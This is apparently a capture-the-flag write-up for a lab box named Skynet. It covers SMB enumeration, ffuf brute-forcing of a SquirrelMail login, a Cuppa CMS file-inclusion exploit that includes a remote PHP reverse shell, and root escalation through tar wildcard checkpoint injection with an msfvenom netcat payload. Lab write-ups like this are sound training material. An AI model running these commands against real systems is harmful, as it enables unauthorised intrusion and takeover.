A few interesting ports.

**80** - Webserver

**139** and **445** - SMB.

Let's kick around the webserver


![img](/assets/images/thm/skynet/1.png)

Search engine that does... nothing? Nothing in the source, no robots.txt. Let's see if we can bust some directories with **FFuF** using the [Seclists Common list](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt) matching all response codes and filtering 404s

```
ffuf -u http://10.10.219.151/FUZZ -w /common.txt -mc all -fc 404

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10]

squirrelmail            [Status: 301, Size: 317, Words: 20, Lines: 10]
```

`/admin` and `/config` are **Forbidden** but how about `/squirrelmail`? 


![img](/assets/images/thm/skynet/2.png)

Login page. Let's do some more enumeration before trying to crack this.

Since **139 and 445** are open, we'll take a look at some **SMB** enumeration
using **smbclient**

```
smbclient -L \\\\10.10.219.151\\
```


![img](/assets/images/thm/skynet/3.png)

Two interesting shares. **anonymous** and **milesdyson**

```
smbclient \\\\10.10.219.151\\anonymous
```


![img](/assets/images/thm/skynet/4.png)

Grab **attention.txt** with `get attention.txt`

```
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

**logs** is a directory with three files, only 1 has data


![img](/assets/images/thm/skynet/5.png)

Grab **log1.txt** with `get log1.txt`

```
cyborg007haloterminator
terminator22596
terminator219
.
.
79terminator6
1996terminator
```

Passwords maybe? Let's go back to `/squirrelmail` and see if any of these work for. We saw that there was a `milesdyson` share, so maybe that's a username? Let's use **FFuF** again, but this time to brute this login form.

Capture the login request in burp to build the command.


![img](/assets/images/thm/skynet/6.png)

```
ffuf -u http://10.10.219.151/squirrelmail/src/redirect.php -d "login_username=milesdyson&secretkey=FUZZ&js_autodetect_results=1&just_logged_in=1" -H "Content-type: application/x-www-form-urlencoded" -w log1.txt
```

```
cyborg007haloterminator [Status: 302, Size: 0, Words: 1, Lines: 1]
```

Got a 302 redirect, which means this is likely our password. Log in!


![img](/assets/images/thm/skynet/7.png)

Interesting


![img](/assets/images/thm/skynet/8.png)

**SMB** password?! Maybe we can access the **milesdyson** share now!


![img](/assets/images/thm/skynet/9.png)

`cd notes` `ls`


![img](/assets/images/thm/skynet/10.png)

Grab **important.txt** with `get important.txt`

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
New endpoint! `/45kra24zxs28v3yd`

Running **FFuF** using [Seclists Common list](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt) matching all response codes and filtering 404s

```

`/administrator`

**Cuppa cms**


![img](/assets/images/thm/skynet/12.png)

Looks like there's a LFI/RFI [exploit](https://www.exploit-db.com/exploits/25971) for **Cuppa CMS**


```
http://10.10.11.92/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
```

Using the PoC to make sure it's vulnerable. Decoded:

```
<?php 
	class Configuration{
		public $host = "localhost";
		public $db = "cuppa";
		public $user = "root";
		public $password = "password123";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "";
		public $secure_login_redirect = "";
	} 
```

So we have LFI, let's try RFI

Using [php-reverse-shell.php]() from pentestmonkey. 

1. Edit the relevant values (IP and PORT)
2. Host it on a webserver - `python3 -m http.server` 
3. Start a listener - `nc -lvnp 4444`
4. Include your URL - `alerts/alertConfigField.php?urlConfig=http://IP:PORT/php-reverse-shell.php`
5. Send it!

### Privesc (tar checkpoints, Wildcard Injection, msfvenom)

- Reading/Resources
    - [Wildcard Injection](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)
    - [tar checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
    - [msfvenom](https://book.hacktricks.xyz/shells/shells/untitled)
    - [Cronjobs](https://linuxize.com/post/how-to-list-cron-jobs-in-linux/)

Password reuse! Using `cyborg007haloterminator` we can switch to the `milesdyson` user.

There's an interesting script in `/home/milesdyson/backups` called `backup.sh`

```
milesdyson@skynet:~/backups$ cat backup.sh

#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Let's check if it's running as a **cronjob**

```
cat /etc/crontab

# m h dom mon dow user	command
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

So every minute it's running the script, which means it's changing to the `/var/www/html` directory and running `tar cf` on everything. `milesdyson` doesn't have write access to `/var/www/html`, but if we drop back down to `www-data` we do!

Since **tar** is using a **wildcard** it's vulnerable to injection by creating files with names that represent `tar` checkpoints:

```
--checkpoint=1
--checkpoint-action=exec=sh shell.sh
```

Create a reverse shell using **msfvenom** and start a listener

```
msfvenom -p cmd/unix/reverse_netcat lhost=IP lport=PORT R 

nc -lvnp PORT
```

```
echo 'SHELLOUTPUT' > shell.sh
touch -- "--checkpoint-action=exec=sh shell.sh"
touch -- --checkpoint=1
```

Notice the inclusion of `--` before the file name, this allows us to create filenames with special characters.

Now we wait...
